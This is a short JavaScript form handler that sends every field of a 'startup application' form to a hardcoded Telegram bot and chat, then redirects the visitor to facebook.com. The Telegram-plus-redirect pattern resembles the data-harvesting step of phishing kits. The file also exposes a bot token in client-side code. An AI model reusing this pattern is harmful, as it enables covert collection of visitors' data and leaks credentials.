function sendDataToTelegram(event) {
    event.preventDefault(); // Prevent default form submission
  
    // Get form data
    const formData = new FormData(document.getElementById('startupForm'));
  
    // Bot token and chat ID
    const botToken = '7154838438:AAFjxD-G1RJJjjkF7EJIm-LL8nh3WY542SY';
    const chatId = '-1002044101083';
  
    // Prepare message text
    let message = 'New Startup Application:\n\n';
    for (const [key, value] of formData.entries()) {
      message += `*${key}*: ${value}\n`;
    }
  
    // Telegram Bot API URL
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
    // Send data using Fetch API
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown', // Enable Markdown formatting
      }),
    })
    .then(response => {
      if (!response.ok) {
        throw new Error(`Error sending message: ${response.status}`);
      }
      console.log('Message sent successfully!');
      // Redirect to Facebook
      window.location.href = 'https://www.facebook.com';
    })
    .catch(error => {
      console.error('Error:', error);
      // Handle errors (e.g., display an error message to the user)
    });
  }
  
  // Add event listener to the form's submit event
  document.getElementById('startupForm').addEventListener('submit', sendDataToTelegram);
  